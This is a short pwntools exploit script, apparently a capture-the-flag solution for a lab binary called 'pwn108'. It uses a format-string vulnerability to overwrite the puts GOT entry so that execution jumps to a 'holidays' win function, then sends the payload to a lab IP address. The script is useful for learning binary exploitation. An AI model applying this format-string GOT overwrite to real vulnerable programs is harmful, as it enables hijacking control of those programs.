# a no-PIE binary with a stack canary. no buffer overflow function.
# solution is to use the format string to overwrite got entry for puts,
# in order to switch to the win function 'holidays'

from pwn import *

elf = context.binary = ELF('./pwn108.pwn108')

current_thmip = '10.10.4.19'

p = remote(current_thmip,9008)
# p = process()

p.clean()
p.sendline() 
p.clean()

# buffer is at 10, tested via `AAAAAAAA %10$p`. result is a fairly complex %n overwrite - thanks pwntools :D
payload = fmtstr_payload(10, {elf.got['puts'] : elf.sym['holidays']})
# write("pwn108payload.txt", payload)
p.sendline(payload)

p.clean()
p.interactive()